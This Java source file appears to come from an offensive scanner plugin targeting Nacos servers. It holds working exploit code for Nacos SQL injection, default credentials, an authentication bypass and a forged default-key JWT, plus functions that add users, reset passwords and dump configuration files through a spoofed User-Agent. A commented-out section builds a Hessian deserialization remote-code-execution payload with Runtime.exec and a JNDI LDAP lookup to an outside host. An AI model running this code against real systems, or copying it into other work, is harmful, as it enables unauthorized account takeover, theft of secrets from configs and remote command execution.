package org.fasnow.mutiple.model.nacos;

import com.alibaba.nacos.v2.config.server.model.ConfigInfo;
import com.alibaba.nacos.v2.console.model.Namespace;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import okhttp3.FormBody;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.fasnow.mutiple.HttpClient;
import org.fasnow.mutiple.Jwt;
import org.fasnow.mutiple.Utils;
import org.fasnow.mutiple.entity.Result;
import org.fasnow.mutiple.vul.Vul;

import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class Nacos implements Vuls {
    public static final HashMap<String, Vul> vuls = new LinkedHashMap<>();
    static {
        vuls.put("CNVD_2020_67618",
                new Vul(
                        "SQL注入(CNVD-2020-67618)",
                        "CNVD-2020-67618",
                        "",
                        "",
                        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-67618"
                )
        );

        vuls.put("CNVD_2021_24491",
                new Vul(
                        "弱口令(CNVD-2021-24491)",
                        "CNVD-2021-24491",
                        "弱口令：nacos/nacos",
                        "",
                        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-24491"
                )
        );
        vuls.put("CVE_2021_29441",
                new Vul(
                        "权限认证绕过漏洞(CVE-2021-29441)",
                        "CVE-2021-29441",
                        "自行搭建的1.2.0<= Nacos <=1.4.0版本，自行搭建的1.4.1及以上版本但未开启服务端身份识别功能的集群。",
                        "",
                        "https://help.aliyun.com/zh/mse/product-overview/nacos-security-vulnerability-description-cve-2021-29441-permission-authentication-bypass-vulnerability"
                )
        );
        vuls.put("QVD_2023_6271",
                new Vul(
                        "默认token.secret.key配置(QVD-2023-6271)",
                        "QVD-2023-6271",
                        "自行搭建的1.2.0<= Nacos <=2.2.0版本的集群未设置自定义密钥，自行搭建的2.2.0.1及以上版本，但仍设置为默认值",
                        "",
                        "https://help.aliyun.com/zh/mse/product-overview/nacos-security-risk-description-about-nacos-default-token-secret-key-risk-description"
                )
        );
//        vuls.put("CNVD_2023_45001",
//                new Vul(
//                        "Jraft端口反序列化漏洞(CNVD-2023-45001)",
//                        "CNVD-2023-45001",
//                        "自行搭建的1.4.0<=Nacos<=1.4.5或2.0.0<=Nacos<=2.2.2版本， 且允许7848端口从外部访问的集群。",
//                        "",
//                        "https://help.aliyun.com/zh/mse/product-overview/nacos-security-risk-description-risk-description-of-deserialization-vulnerability-of"
//                )
//        );
    }
    public  static final String PLUGIN_NAME = "nacos";
    private String target;
    private String version;
    public Nacos(){

    }

    public void setTarget(String target) throws Exception {
        this.target = Utils.formatUrl(target);
    }

    public String getTarget(){
        return target;
    }

    private String addDefaultContextPath(String path, boolean add){
        return target+(add ? "/nacos": "")+ path;
    }

    @Override
    public Result CNVD_2020_67618(boolean add) throws Exception {
        Request request = new Request.Builder()
                .url(addDefaultContextPath("/v1/cs/ops/derby?sql=select * from users",add))
                .get()
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        return new Result(body.contains("USERNAME")&&body.contains("PASSWORD"),body);
    }

    @Override
    public Result CVE_2021_29441(boolean add) throws Exception {
        Request request = new Request.Builder()
                .url(addDefaultContextPath("/v1/auth/users?pageNo=1&pageSize=1",add))
                .get()
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        return new Result(body.contains("totalCount"),body);
    }

    @Override
    public Result CNVD_2021_24491(boolean add) throws Exception {
        RequestBody formBody = new FormBody.Builder()
                .add("username", "nacos")
                .add("password", "nacos")
                .build();
        int r = Utils.versionCompare(getVersion(),"1.2.0-beta.0");
        String tokenField = r<0?"data":"accessToken";
        String path = r<0?"/v1/auth/login":"/v1/auth/users/login";
        Request request = new Request.Builder()
                .url(addDefaultContextPath(path,add))
                .post(formBody)
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        return new Result(body.contains(tokenField),body);
    }

    @Override
    public Result QVD_2023_6271(boolean add) throws Exception {
        String authorization = "Bearer "+ Jwt.generateJwt(Utils.getRandomString(8));
        RequestBody formBody = new FormBody.Builder()
                .add("username", Utils.getRandomString(8))
                .add("password", Utils.getRandomString(8))
                .build();
        Request request = new Request.Builder()
                .url(addDefaultContextPath("/v1/auth/users/login",add))
                .post(formBody)
                .header("User-Agent",Utils.USER_AGENT)
                .header("Authorization",authorization)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        return new Result(authorization.equals(response.header("Authorization")),response.body().string());
    }

//    ref:https://mp.weixin.qq.com/s/F6S-i6Ii9blH-zyMFGYkZQ
//    @Override
//    public Result CNVD_2023_45001(String targetUrl) throws Exception{
//        String address = "10.0.0.1:7848";
//
//        //初始化 RPC 服务
//        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
//        cliClientService.init(new CliOptions());
//        GrpcClient grpcClient = (GrpcClient) cliClientService.getRpcClient();
//
//        //反射添加WriteRequest，不然会抛出异常
//        Field parserClassesField = GrpcClient.class.getDeclaredField("parserClasses");
//        parserClassesField.setAccessible(true);
//        Map<String, Message> parserClasses = (Map) parserClassesField.get(grpcClient);
//        parserClasses.put(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
//
//        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
//
//        byte[] poc = build();
//        WriteRequest request = WriteRequest.newBuilder()
//                .setGroup("naming_instance_metadata")
//                .setData(ByteString.copyFrom(poc))
//                .build();
//        PeerId leader = PeerId.parsePeer(address);
//        Object res = grpcClient.invokeSync(leader.getEndpoint(), request,5000);
//        System.out.println(res);
//        return new Result(false,"");
//    }

    public String getVersion() throws Exception {
//        if(!"".equals(version)){
//            return version;
//        }
        Request request = new Request.Builder()
                .url(target+"/v1/console/server/state")
                .get()
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        ObjectMapper objectMapper = new ObjectMapper();
        JsonNode jsonNode = objectMapper.readTree(response.body().string());
        version = jsonNode.get("version").asText();
        return version;
    }

    public Result addUser(String username,String password) throws Exception {
        RequestBody formBody = new FormBody.Builder()
                .add("username", username)
                .add("password", password)
                .build();
        Request request = new Request.Builder()
                .url(target+"/v1/auth/users")
                .post(formBody)
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        return new Result(body.contains("create user ok!"),body);
    }

    public Result deleteUser(String username) throws Exception {
        Request request = new Request.Builder()
                .url(target+"/v1/auth/users?username="+username)
                .delete()
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        return new Result(body.contains("delete user ok!"),body);
    }

    public Result resetPassword(String username,String password) throws Exception {
        RequestBody formBody = new FormBody.Builder()
                .add("username", username)
                .add("newPassword", password)
                .build();
        Request request = new Request.Builder()
                .url(target+"/v1/auth/users")
                .put(formBody)
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        return new Result(body.contains("update user ok!"),body);
    }

    public List<Namespace> getNamespacesWithAuthToken(String authorization) throws Exception {
        Request.Builder builder = new Request.Builder()
                .url(target+"/v1/console/namespaces")
                .get()
                .header("User-Agent",Utils.USER_AGENT);
        if(authorization!=null && !"".equals(authorization)){
            builder = builder.header("Authorization",adaptAuthorization(authorization));
        }
        Request request = builder.build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        ObjectMapper objectMapper = new ObjectMapper();
        Map<String, Object> jsonMap = objectMapper.readValue(body, new TypeReference<Map<String, Object>>() {});
        Object dataFieldValue = jsonMap.get("data");
        return objectMapper.convertValue(dataFieldValue, new TypeReference<List<Namespace>>() {});
    }

    public List<ConfigInfo> getConfigsWithAuthToken(String authorization, String tenant, int configCount) throws Exception {
        String fullUrl = target+String.format("/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=%d&tenant=%s&search=accurate",configCount,tenant);
        Request.Builder builder = new Request.Builder()
                .url(fullUrl)
                .get()
                .header("User-Agent",Utils.USER_AGENT);
        if(authorization!=null && !"".equals(authorization)){
            builder = builder.header("Authorization",adaptAuthorization(authorization));
        }
        Request request = builder.build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        ObjectMapper objectMapper = new ObjectMapper();
        Map<String, Object> jsonMap = objectMapper.readValue(body, new TypeReference<Map<String, Object>>() {});
        Object dataFieldValue = jsonMap.get("pageItems");
        return objectMapper.convertValue(dataFieldValue, new TypeReference<List<ConfigInfo>>() {});
    }

    public List<Namespace> getNamespacesWithMisconfig() throws Exception {
        String fullUrl = target+"/v1/console/namespaces";
        Request request = new Request.Builder()
                .url(fullUrl)
                .get()
                .header("User-Agent","Nacos-Server")
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        ObjectMapper objectMapper = new ObjectMapper();
        Map<String, Object> jsonMap = objectMapper.readValue(body, new TypeReference<Map<String, Object>>() {});
        Object dataFieldValue = jsonMap.get("data");
        return objectMapper.convertValue(dataFieldValue, new TypeReference<List<Namespace>>() {});
    }

    public List<ConfigInfo> getConfigsWithMisconfig(String tenant, int configCount) throws Exception {
        String fullUrl = target+String.format("/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=%d&tenant=%s&search=accurate",configCount,tenant);
        Request request = new Request.Builder()
                .url(fullUrl)
                .get()
                .header("User-Agent","Nacos-Server")
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        String body = response.body().string();
        ObjectMapper objectMapper = new ObjectMapper();
        Map<String, Object> jsonMap = objectMapper.readValue(body, new TypeReference<Map<String, Object>>() {});
        Object dataFieldValue = jsonMap.get("pageItems");
        return objectMapper.convertValue(dataFieldValue, new TypeReference<List<ConfigInfo>>() {});
    }

    public String login(String username, String password) throws Exception {
        //版本小于 1.2.0-beta.0 为 /v1/auth/login
        //版本大于等于 1.2.0-beta.0 为 /v1/auth/users/login
        int r = Utils.versionCompare(getVersion(),"1.2.0-beta.0");
        String tokenField = r<0?"data":"accessToken";
        String path = r<0?"/v1/auth/login":"/v1/auth/users/login";
        RequestBody formBody = new FormBody.Builder()
                .add("username", username)
                .add("password", password)
                .build();
        Request request = new Request.Builder()
                .url(target+path)
                .post(formBody)
                .header("User-Agent",Utils.USER_AGENT)
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        if(response.code()!=200){
            throw new Exception(response.body().string());
        }
        String body = response.body().string();
        ObjectMapper objectMapper = new ObjectMapper();
        JsonNode jsonNode = objectMapper.readTree(body);
        String authorization = jsonNode.get(tokenField).asText();
        if("null".equals(authorization) || null == authorization){
            throw new Exception(jsonNode.get("message").asText());
        }
        return authorization;
    }

    public boolean validAuthToken(String authorization) throws Exception {
        int r = Utils.versionCompare(getVersion(),"1.2.0-beta.0");
        if(r<0){
            Request request = new Request.Builder()
                    .url(target+"/v1/console/namespaces?namespaceId="+Utils.getRandomString(8))
                    .get()
                    .header("User-Agent",Utils.USER_AGENT)
                    .header("Authorization","Bearer "+authorization)
                    .build();
            Response response = HttpClient.client.newCall(request).execute();
            if(response.code()==200){
                return true;
            }
            if(response.code()==401){
                return false;
            }
            throw new Exception(response.body().string());
        }
        RequestBody formBody = new FormBody.Builder()
                .add("username", Utils.getRandomString(8))
                .add("password", Utils.getRandomString(8))
                .build();
        Request request = new Request.Builder()
                .url(target+adaptLoginPath())
                .post(formBody)
                .header("User-Agent",Utils.USER_AGENT)
                .header("Authorization",adaptAuthorization(authorization))
                .build();
        Response response = HttpClient.client.newCall(request).execute();
        if(response.code()==403){
            return false;
        }
        if(!"".equals(response.header("Authorization"))){
            return true;
        }
        throw new Exception(response.body().string());
    }

//    private static byte[] build() throws Exception {
//
////        执行字节码
////        JavaClass evil = Repository.lookupClass("calc");
////        //无法rce，不明
////        byte[] code= Files.readAllBytes(Paths.get("D:\\Tmp\\nacos-2.2.1-src\\nacos-2.2.1\\console\\src\\main\\java\\com\\fasnow\\Evil.class"));
////        String payload = "$$BCEL$$" + Utility.encode(code, true);
//
//        JavaClass clazz = Repository.lookupClass(Evil.class);
//        String payload = "$$BCEL$$" + Utility.encode(clazz.getBytes(), true);
//
//        SwingLazyValue slz = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}});
//        UIDefaults uiDefaults1 = new UIDefaults();
//        UIDefaults uiDefaults2 = new UIDefaults();
//        uiDefaults1.put("_", slz);
//        uiDefaults2.put("_", slz);
////        执行jndi注入
////        SwingLazyValue swingLazyValue = new SwingLazyValue("javax.naming.InitialContext","doLookup",new String[]{"ldap://172.17.0.1:1389/Jackson"});
////
////        UIDefaults uiDefaults1 = new UIDefaults();
////        UIDefaults uiDefaults2 = new UIDefaults();
////        uiDefaults1.put("aaa", swingLazyValue);
////        uiDefaults2.put("aaa", swingLazyValue);
//
//        HashMap hashMap = makeMap(uiDefaults1,uiDefaults2);
//        MetadataOperation metadataOperation = new MetadataOperation();
//        setFieldValue(metadataOperation,"metadata",hashMap);
//
//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//        Hessian2Output oo = new Hessian2Output(baos);
//        oo.setSerializerFactory(new SerializerFactory());
//        oo.getSerializerFactory().setAllowNonSerializable(true);
//        oo.writeObject(metadataOperation);
//        oo.flush();
//        return baos.toByteArray();
//    }
//
//    public static byte[] build(String cmd) throws Exception {
//        String[]       command        = {"cmd", "/c", cmd};
//        java.lang.reflect.Method invoke         = MethodUtil.class.getMethod("invoke", java.lang.reflect.Method.class, Object.class, Object[].class);
//        Method exec           = Runtime.class.getMethod("exec", String[].class);
//        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{command}}});
//        //Object value = swingLazyValue.createValue(new UIDefaults());
//        //
//        //Method getClassFactoryMethod = SerializerFactory.class.getDeclaredMethod("getClassFactory");
//        //SwingLazyValue swingLazyValue1 = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{getClassFactoryMethod, SerializerFactory.createDefault(), new Object[]{}}});
//        //Object value = swingLazyValue1.createValue(new UIDefaults());
//        //
//        //Method allowMethod = ClassFactory.class.getDeclaredMethod("allow", String.class);
//        //SwingLazyValue swingLazyValue2 = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{allowMethod, value, new Object[]{"*"}}});
//        //Object value1 = swingLazyValue2.createValue(new UIDefaults());
//        //System.out.println(value1);
//
//        UIDefaults u1 = new UIDefaults();
//        UIDefaults u2 = new UIDefaults();
//        u1.put("key", swingLazyValue);
//        u2.put("key", swingLazyValue);
//        HashMap     hashMap     = new HashMap();
//        Class       node        = Class.forName("java.util.HashMap$Node");
//        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
//        constructor.setAccessible(true);
//        Object node1 = constructor.newInstance(0, u1, null, null);
//        Object node2 = constructor.newInstance(0, u2, null, null);
//        Field key   = node.getDeclaredField("key");
//        key.setAccessible(true);
//        key.set(node1, u1);
//        key.set(node2, u2);
//        Field size = HashMap.class.getDeclaredField("size");
//        size.setAccessible(true);
//        size.set(hashMap, 2);
//        Field table = HashMap.class.getDeclaredField("table");
//        table.setAccessible(true);
//        Object arr = Array.newInstance(node, 2);
//        Array.set(arr, 0, node1);
//        Array.set(arr, 1, node2);
//        table.set(hashMap, arr);
//
//
//        HashMap hashMap1 = new HashMap();
//        size.set(hashMap1, 2);
//        table.set(hashMap1, arr);
//
//
//        HashMap map = new HashMap();
//        map.put(hashMap, hashMap);
//        map.put(hashMap1, hashMap1);
//        MetadataOperation metadataOperation = new MetadataOperation();
//        setFieldValue(metadataOperation,"metadata",hashMap);
//        ByteArrayOutputStream baos   = new ByteArrayOutputStream();
//        Hessian2Output        output = new Hessian2Output(baos);
//        output.getSerializerFactory().setAllowNonSerializable(true);
//        output.writeObject(metadataOperation);
//        output.flushBuffer();
//
//        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(baos.toByteArray()));
//        SerializerFactory.createDefault().getClassFactory().allow("*");
////        hessian2Input.readObject();
//
//        return baos.toByteArray();
//    }
//    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
//        HashMap<Object, Object> s = new HashMap<>();
//        setFieldValue(s, "size", 2);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        } catch (ClassNotFoundException e) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//
//        Object tbl = Array.newInstance(nodeC, 2);
//        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
//        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
//        setFieldValue(s, "table", tbl);
//        return s;
//    }
//    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
//        Field field = obj.getClass().getDeclaredField(name);
//        field.setAccessible(true);
//        field.set(obj, value);
//    }

    public static String ConfigListToString(List<ConfigInfo> list){
        StringBuilder result = new StringBuilder();
        for (ConfigInfo config : list) {
            result.append(String.format("---------%s---------\n",config.getDataId())).append(config.getContent()).append(",\n");
        }

        // 删除最后添加的逗号和\n
        if (result.length() > 1) {
            result.delete(result.length() - 2, result.length());
        }

        return result.toString();
    }

    public static String NamespaceListToString(List<Namespace> list){
        StringBuilder result = new StringBuilder();
        for (Namespace namespace : list) {
            result.append(namespace.getNamespaceShowName()).append("    配置文件个数:").append(namespace.getConfigCount()).append("\n");
        }

        // 删除最后添加的\n
        if (result.length() > 1) {
            result.delete(result.length() - 1, result.length());
        }

        return result.toString();
    }
    private String adaptAuthorization(String authorization) throws Exception {
        int r = Utils.versionCompare(getVersion(),"1.2.0-beta.0");
        if(r<0 && !authorization.startsWith("Bearer ")){
            //适配版本小于 1.2.0-beta.0
            authorization="Bearer "+authorization;
        }
        return authorization;
    }

    private String adaptLoginPath() throws Exception {
        int r = Utils.versionCompare(getVersion(),"1.2.0-beta.0");
        return r<0?"/v1/auth/login":"/v1/auth/users/login";
    }
}

